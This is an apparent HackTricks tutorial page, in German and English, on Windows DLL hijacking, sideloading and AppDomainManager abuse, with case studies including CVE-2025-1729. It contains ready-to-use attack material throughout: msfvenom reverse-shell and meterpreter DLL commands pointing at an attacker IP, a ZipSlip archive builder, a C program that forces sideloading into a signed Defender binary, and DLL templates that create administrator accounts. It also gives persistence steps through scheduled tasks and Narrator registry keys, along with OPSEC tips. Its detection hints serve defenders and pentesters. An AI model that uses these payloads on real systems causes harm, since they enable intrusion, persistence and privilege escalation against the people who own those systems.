# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking beinhaltet die Manipulation einer vertrauenswürdigen Anwendung, damit sie eine bösartige DLL lädt. Der Begriff umfasst mehrere Taktiken wie **DLL Spoofing, Injection, and Side-Loading**. Er wird hauptsächlich für Code Execution, Persistence und seltener für Privilege Escalation genutzt. Trotz des hier liegenden Fokus auf Escalation bleibt die Hijacking-Methode über die Ziele hinweg gleich.

### Common Techniques

Für DLL Hijacking werden mehrere Methoden verwendet, deren Wirksamkeit von der DLL-Loading-Strategie der Anwendung abhängt:

1. **DLL Replacement**: Ersetzen einer echten DLL durch eine bösartige, optional mit DLL Proxying, um die Funktionalität der ursprünglichen DLL zu erhalten.
2. **DLL Search Order Hijacking**: Platzieren der bösartigen DLL in einem Suchpfad vor der legitimen, um das Suchmuster der Anwendung auszunutzen.
3. **Phantom DLL Hijacking**: Erstellen einer bösartigen DLL für eine Anwendung, die davon ausgeht, dass es sich um eine nicht existierende, benötigte DLL handelt.
4. **DLL Redirection**: Ändern von Suchparametern wie `%PATH%` oder `.exe.manifest` / `.exe.local` Dateien, um die Anwendung zur bösartigen DLL umzuleiten.
5. **WinSxS DLL Replacement**: Ersetzen der legitimen DLL durch ein bösartiges Gegenstück im WinSxS-Verzeichnis, eine Methode, die oft mit DLL side-loading verbunden ist.
6. **Relative Path DLL Hijacking**: Platzieren der bösartigen DLL in einem vom Benutzer kontrollierten Verzeichnis zusammen mit der kopierten Anwendung, ähnlich wie bei Binary Proxy Execution Techniken.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Klassisches DLL sideloading ist nicht der einzige Weg, um einen vertrauenswürdigen **.NET Framework**-Prozess dazu zu bringen, attacker code zu laden. Wenn die Ziel-EXE eine **managed** Anwendung ist, berücksichtigt der CLR auch eine **application configuration file**, die nach der EXE benannt ist (zum Beispiel `Setup.exe.config`). Diese Datei kann einen benutzerdefinierten **AppDomainManager** definieren. Wenn die Konfiguration auf eine vom Angreifer kontrollierte assembly neben der EXE verweist, lädt der CLR sie **vor dem normalen Codepfad der Anwendung** und führt sie innerhalb des vertrauenswürdigen Prozesses aus.

Laut dem .NET Framework configuration schema von Microsoft müssen sowohl `<appDomainManagerAssembly>` als auch `<appDomainManagerType>` vorhanden sein, damit der benutzerdefinierte Manager verwendet wird.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimal Manager:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Praktische Hinweise:
- Dies ist **.NET Framework-spezifische** Tradecraft. Es hängt vom CLR-Konfigurationsparsing ab, nicht von der Win32-DLL-Suchreihenfolge.
- Der Host muss wirklich eine **managed EXE** sein. Schneller Check: `sigcheck -m target.exe`, `corflags target.exe`, oder nach dem **CLR Runtime Header** in den PE-Metadaten suchen.
- Der Config-Dateiname muss exakt zum Exe-Namen passen (`<binary>.config`) und liegt meist **direkt neben der EXE**.
- Das ist nützlich bei **signierten Microsoft-/Vendor-Binaries**, weil die vertrauenswürdige EXE unverändert bleibt, während die bösartige managed assembly im Prozess ausgeführt wird.
- Wenn du bereits ein beschreibbares Installer-/Update-Verzeichnis hast, kann AppDomainManager hijacking als **erste Stufe** dienen, gefolgt von klassischem DLL side-loading oder reflective loading für spätere Stufen.

### Hijacking einer bestehenden geplanten Aufgabe, um die sideload chain erneut zu starten

Für Persistence solltest du nicht nur nach **dem Erstellen einer neuen task** suchen. Manche Intrusion Sets warten, bis ein legitimer Installer eine **normale updater task** anlegt, und **schreiben dann die task action um**, sodass Name, Autor und Trigger für Defender vertraut bleiben.

Wiederverwendbarer Ablauf:
1. Die legitime Software installieren/ausführen und die task identifizieren, die sie normalerweise erstellt.
2. Den task-XML exportieren und die aktuellen Werte von `<Exec><Command>` / `<Arguments>` notieren.
3. Nur die action ersetzen, sodass die task deine **trusted host EXE** aus einem user-writable staging directory startet, die dann das echte payload per side-loading oder AppDomain-load ausführt.
4. Dieselbe task name erneut registrieren, statt ein neues offensichtliches persistence artifact zu erstellen.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Warum es stealthier ist:
- Der Task-Name kann weiterhin legitim aussehen (zum Beispiel ein Vendor-Updater).
- Der **Task Scheduler service** startet ihn, daher sieht die Parent-/Ancestor-Validierung oft die erwartete Scheduling-Kette statt `explorer.exe`.
- DFIR-Teams, die nur nach **neuen Task-Namen** suchen, können einen Task übersehen, dessen Registrierung bereits existierte, dessen Action aber nun auf `%LOCALAPPDATA%`, `%APPDATA%` oder einen anderen vom Angreifer kontrollierten Pfad zeigt.

Schnelle Hunting-Pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Vergleiche `C:\Windows\System32\Tasks\*` XML und `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` Metadaten gegen eine Baseline.
- Alarmiere, wenn ein **vendor-looking updater task** aus **user-writable directories** ausgeführt wird oder eine .NET EXE mit einer danebenliegenden `*.config`-Datei startet.

> [!TIP]
> Für eine Schritt-für-Schritt-Kette, die HTML staging, AES-CTR configs und .NET implants zusätzlich zu DLL sideloading kombiniert, siehe den Workflow unten.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

Der häufigste Weg, fehlende Dlls in einem System zu finden, ist, [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) von Sysinternals auszuführen und **die** **folgenden 2 Filter** zu setzen:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

und nur die **File System Activity** anzeigen:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

Wenn du allgemein nach **missing dlls** suchst, lässt du das für einige **seconds** laufen.\
Wenn du nach einer **missing dll inside an specific executable** suchst, solltest du einen **anderen Filter wie "Process Name" "contains" `<exec name>` setzen, ihn ausführen und die Erfassung der Events stoppen**.

## Exploiting Missing Dlls

Um Privilegien zu eskalieren, ist unsere beste Chance, eine **dll zu schreiben, die ein privilegierter Prozess laden will**, und zwar an einem Ort, an dem danach gesucht wird. Daher können wir entweder eine **dll** in einen **Ordner schreiben**, in dem die **dll vor** dem Ordner gesucht wird, in dem die **original dll** liegt (seltsamer Fall), oder wir können in einen Ordner schreiben, in dem nach der dll gesucht wird, während die originale **dll** in keinem Ordner existiert.

### Dll Search Order

**In der** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **kannst du sehen, wie die Dlls genau geladen werden.**

**Windows applications** suchen nach DLLs anhand einer Reihe von **pre-defined search paths** in einer festen Reihenfolge. Das Problem des DLL hijacking entsteht, wenn eine schädliche DLL gezielt in einem dieser Verzeichnisse platziert wird, sodass sie vor der echten DLL geladen wird. Eine Lösung, um das zu verhindern, ist, dass die Anwendung beim Verweisen auf die benötigten DLLs absolute Pfade verwendet.

Die **DLL search order auf 32-bit** Systemen sieht so aus:

1. Das Verzeichnis, aus dem die Anwendung geladen wurde.
2. Das Systemverzeichnis. Verwende die [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya)-Funktion, um den Pfad dieses Verzeichnisses zu erhalten.(_C:\Windows\System32_)
3. Das 16-bit-Systemverzeichnis. Es gibt keine Funktion, die den Pfad dieses Verzeichnisses ermittelt, aber es wird durchsucht. (_C:\Windows\System_)
4. Das Windows-Verzeichnis. Verwende die [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)-Funktion, um den Pfad dieses Verzeichnisses zu erhalten.
1. (_C:\Windows_)
5. Das aktuelle Verzeichnis.
6. Die Verzeichnisse, die in der PATH-Umgebungsvariable aufgeführt sind. Beachte, dass der pro Anwendung definierte Pfad aus dem **App Paths** Registry-Schlüssel nicht enthalten ist. Der **App Paths**-Schlüssel wird bei der Berechnung des DLL search path nicht verwendet.

Das ist die **default**-Suchreihenfolge mit aktiviertem **SafeDllSearchMode**. Wenn er deaktiviert ist, rückt das aktuelle Verzeichnis auf den zweiten Platz. Um diese Funktion zu deaktivieren, erstelle den Registry-Wert **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** und setze ihn auf 0 (default ist aktiviert).

Wenn die Funktion [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) mit **LOAD_WITH_ALTERED_SEARCH_PATH** aufgerufen wird, beginnt die Suche im Verzeichnis des ausführbaren Moduls, das **LoadLibraryEx** lädt.

Beachte außerdem, dass eine **dll mit dem absoluten Pfad statt nur mit dem Namen geladen werden kann**. In diesem Fall wird diese dll **nur in diesem Pfad gesucht** (wenn die dll Abhängigkeiten hat, werden diese so gesucht, als wären sie einfach per Name geladen worden).

Es gibt noch andere Möglichkeiten, die Search Order zu verändern, aber ich werde sie hier nicht erklären.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Nutze **ProcMon**-Filter (`Process Name` = target EXE, `Path` endet mit `.dll`, `Result` = `NAME NOT FOUND`), um DLL-Namen zu sammeln, nach denen der Prozess sucht, die er aber nicht findet.
2. Wenn das Binary per **schedule/service** läuft, wird eine DLL mit einem dieser Namen im **application directory** (search-order entry #1) beim nächsten Ausführen geladen. In einem .NET-Scanner-Fall suchte der Prozess nach `hostfxr.dll` in `C:\samples\app\`, bevor er die echte Kopie aus `C:\Program Files\dotnet\fxr\...` lud.
3. Erstelle eine Payload-DLL (z. B. reverse shell) mit irgendeinem Export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Wenn dein Primitive ein **ZipSlip-style arbitrary write** ist, baue ein ZIP, dessen Eintrag aus dem Extraktionsverzeichnis ausbricht, sodass die DLL im App-Ordner landet:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Deliver the archive to the watched inbox/share; when the scheduled task re-launches the process it loads the malicious DLL and executes your code as the service account.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Ein fortgeschrittener Weg, den DLL-Suchpfad eines neu erstellten Prozesses deterministisch zu beeinflussen, ist, das Feld DllPath in RTL_USER_PROCESS_PARAMETERS beim Erstellen des Prozesses mit den nativen APIs von ntdll zu setzen. Indem hier ein vom Angreifer kontrolliertes Verzeichnis angegeben wird, kann ein Zielprozess, der eine importierte DLL per Name auflöst (kein absoluter Pfad und ohne die sicheren Lade-Flags), gezwungen werden, eine bösartige DLL aus diesem Verzeichnis zu laden.

Key idea
- Erstelle die Prozessparameter mit RtlCreateProcessParametersEx und gib einen benutzerdefinierten DllPath an, der auf deinen kontrollierten Ordner zeigt (z. B. das Verzeichnis, in dem dein Dropper/Unpacker liegt).
- Erstelle den Prozess mit RtlCreateUserProcess. Wenn das Ziel-Binary eine DLL per Name auflöst, fragt der Loader während der Auflösung diesen übergebenen DllPath ab und ermöglicht so zuverlässiges sideloading, selbst wenn die bösartige DLL nicht neben der Ziel-EXE liegt.

Notes/limitations
- Dies betrifft den zu erstellenden Child-Prozess; es unterscheidet sich von SetDllDirectory, das nur den aktuellen Prozess beeinflusst.
- Das Ziel muss eine DLL per Name importieren oder per LoadLibrary laden (kein absoluter Pfad und ohne LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs und fest kodierte absolute Pfade können nicht hijacked werden. Forwarded exports und SxS können die Reihenfolge verändern.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

This technique has been observed in-the-wild to drive multi-stage sideloading chains: an initial launcher drops a helper DLL, which then spawns a Microsoft-signed, hijackable binary with a custom DllPath to force loading of the attacker’s DLL from a staging directory.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Escalating Privileges

**Requirements**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

Yeah, the requisites are complicated to find as **by default it's kind of weird to find a privileged executable missing a dll** and it's even **more weird to have write permissions on a system path folder** (you can't by default). But, in misconfigured environments this is possible.\
In the case you are lucky and you find yourself meeting the requirements, you could check the [UACME](https://github.com/hfiref0x/UACME) project. Even if the **main goal of the project is bypass UAC**, you may find there a **PoC** of a Dll hijaking for the Windows version that you can use (probably just changing the path of the folder where you have write permissions).

Note that you can **check your permissions in a folder** doing:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Und **prüfe die Berechtigungen aller Ordner innerhalb von PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Du kannst auch die Imports einer ausführbaren Datei und die Exports einer dll mit prüfen:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Für eine vollständige Anleitung, wie man **Dll Hijacking missbraucht, um Privilegien zu eskalieren**, mit Berechtigungen zum Schreiben in einen **System Path folder**, siehe:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)prüft, ob du Schreibrechte auf irgendeinem Ordner innerhalb des system PATH hast.\
Andere interessante automatisierte Tools, um diese Schwachstelle zu entdecken, sind die **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ und _Write-HijackDll._

### Example

Falls du ein ausnutzbares Szenario findest, ist eines der wichtigsten Dinge, um es erfolgreich auszunutzen, eine **dll zu erstellen, die mindestens alle Funktionen exportiert, die die Executable von ihr importieren wird**. Trotzdem beachte, dass Dll Hijacking hilfreich ist, um [von Medium Integrity level zu High zu eskalieren **(UAC umgehen)**](../../authentication-credentials-uac-and-efs/index.html#uac) oder von [**High Integrity zu SYSTEM**](../index.html#from-high-integrity-to-system)**.** Du findest ein Beispiel dafür, **wie man eine gültige dll erstellt**, in dieser Studie zu dll hijacking, die sich auf dll hijacking zur Ausführung konzentriert: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Außerdem findest du im **nächsten Abschnitt** einige **grundlegende dll codes**, die als **templates** nützlich sein können oder um eine **dll mit nicht benötigten exportierten Funktionen** zu erstellen.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Im Grunde ist ein **Dll proxy** eine Dll, die **deinen bösartigen Code ausführen kann, wenn sie geladen wird**, aber auch **expose** und **work** kann, wie **erwartet**, indem sie **alle Aufrufe an die echte library weiterleitet**.

Mit dem Tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) oder [**Spartacus**](https://github.com/Accenture/Spartacus) kannst du tatsächlich **eine Executable angeben und die library auswählen**, die du proxifyen willst, und **eine proxified dll erzeugen** oder **die Dll angeben** und **eine proxified dll erzeugen**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Einen meterpreter (x86) erhalten:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Einen User erstellen (x86, ich habe keine x64-Version gesehen):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Eigene

Beachte, dass in mehreren Fällen die Dll, die du kompilierst, **mehrere Funktionen exportieren** muss, die vom Opferprozess geladen werden. Wenn diese Funktionen nicht existieren, kann die **Binary sie nicht laden** und der **Exploit wird fehlschlagen**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL-Beispiel mit Benutzererstellung</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternatives C-DLL mit Thread-Einstiegspunkt</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Fallstudie: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe prüft beim Start weiterhin eine vorhersagbare, sprachspezifische Localization DLL, die für beliebige Codeausführung und Persistenz hijacked werden kann.

Wichtige Fakten
- Probe-Pfad (aktuelle Builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy-Pfad (ältere Builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Wenn eine beschreibbare, vom Angreifer kontrollierte DLL am OneCore-Pfad existiert, wird sie geladen und `DllMain(DLL_PROCESS_ATTACH)` ausgeführt. Es sind keine Exports erforderlich.

Erkennung mit Procmon
- Filter: `Process Name is Narrator.exe` und `Operation is Load Image` oder `CreateFile`.
- Narrator starten und den Ladeversuch des obigen Pfads beobachten.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Ein naiver hijack wird die UI sprechen/hervorheben. Um leise zu bleiben, beim attach die Narrator-Threads enumerieren, den Haupt-Thread (`OpenThread(THREAD_SUSPEND_RESUME)`) öffnen und mit `SuspendThread` anhalten; in deinem eigenen Thread fortfahren. Siehe PoC für den vollständigen Code.

Trigger und Persistence über Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Mit dem oben genannten wird beim Start von Narrator die platzierte DLL geladen. Auf dem secure desktop (logon screen) drücke CTRL+WIN+ENTER, um Narrator zu starten; deine DLL wird als SYSTEM auf dem secure desktop ausgeführt.

RDP-triggered SYSTEM execution (lateral movement)
- Klassische RDP security layer erlauben: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Per RDP auf den Host gehen, am logon screen CTRL+WIN+ENTER drücken, um Narrator zu starten; deine DLL wird als SYSTEM auf dem secure desktop ausgeführt.
- Die Ausführung stoppt, wenn die RDP-Session geschlossen wird—schnell inject/migrate.

Bring Your Own Accessibility (BYOA)
- Du kannst einen eingebauten Accessibility Tool (AT)-Registry-Eintrag klonen (z. B. CursorIndicator), ihn so bearbeiten, dass er auf eine beliebige binary/DLL zeigt, ihn importieren und dann `configuration` auf diesen AT-Namen setzen. Das proxyt beliebige Ausführung unter dem Accessibility framework.

Notes
- Das Schreiben unter `%windir%\System32` und das Ändern von HKLM-Werten erfordert Admin-Rechte.
- Die gesamte payload-Logik kann in `DLL_PROCESS_ATTACH` liegen; Exports sind nicht nötig.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Dieser Fall demonstriert **Phantom DLL Hijacking** in Lenovos TrackPoint Quick Menu (`TPQMAssistant.exe`), erfasst als **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker kann einen bösartigen `hostfxr.dll`-Stub im selben Verzeichnis platzieren und die fehlende DLL ausnutzen, um Codeausführung im Kontext des Users zu erreichen:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. Als Standardbenutzer `hostfxr.dll` nach `C:\ProgramData\Lenovo\TPQM\Assistant\` ablegen.
2. Warten, bis der Scheduled Task um 9:30 AM im Kontext des aktuellen Benutzers ausgeführt wird.
3. Wenn ein Administrator zum Zeitpunkt der Ausführung des Tasks angemeldet ist, läuft die bösartige DLL in der Session des Administrators mit medium integrity.
4. Standard-UAC-bypass-Techniken verkettet verwenden, um von medium integrity zu SYSTEM-Privileges zu eskalieren.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors kombinieren häufig MSI-basierte Dropper mit DLL side-loading, um Payloads unter einem vertrauenswürdigen, signierten Prozess auszuführen.

Chain overview
- User lädt MSI herunter. Eine CustomAction läuft während der GUI-Installation lautlos (z. B. LaunchApplication oder eine VBScript-Action) und rekonstruiert die nächste Stufe aus eingebetteten Ressourcen.
- Der Dropper schreibt eine legitime, signierte EXE und eine bösartige DLL in dasselbe Verzeichnis (Beispielpaar: Avast-signierte wsc_proxy.exe + attacker-controlled wsc.dll).
- Wenn die signierte EXE gestartet wird, lädt die Windows DLL search order zuerst wsc.dll aus dem working directory und führt den Angreifercode unter einem signierten Parent aus (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Auf Einträge achten, die Executables oder VBScript ausführen. Beispiel für ein verdächtiges Muster: LaunchApplication führt eine eingebettete Datei im Hintergrund aus.
- In Orca (Microsoft Orca.exe) die Tables CustomAction, InstallExecuteSequence und Binary untersuchen.
- Embedded/split Payloads im MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Oder lessmsi verwenden: lessmsi x package.msi C:\out
- Auf mehrere kleine Fragmente achten, die von einer VBScript CustomAction zusammengefügt und entschlüsselt werden. Typischer Ablauf:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktisches sideloading mit wsc_proxy.exe
- Lege diese beiden Dateien im selben Ordner ab:
- wsc_proxy.exe: legitimer signierter Host (Avast). Der Prozess versucht, wsc.dll per Namen aus seinem Verzeichnis zu laden.
- wsc.dll: attacker DLL. Wenn keine bestimmten Exports erforderlich sind, kann DllMain ausreichen; andernfalls erstelle eine Proxy DLL und leite die benötigten Exports an die echte Library weiter, während der Payload in DllMain ausgeführt wird.
- Erstelle einen minimalen DLL-Payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
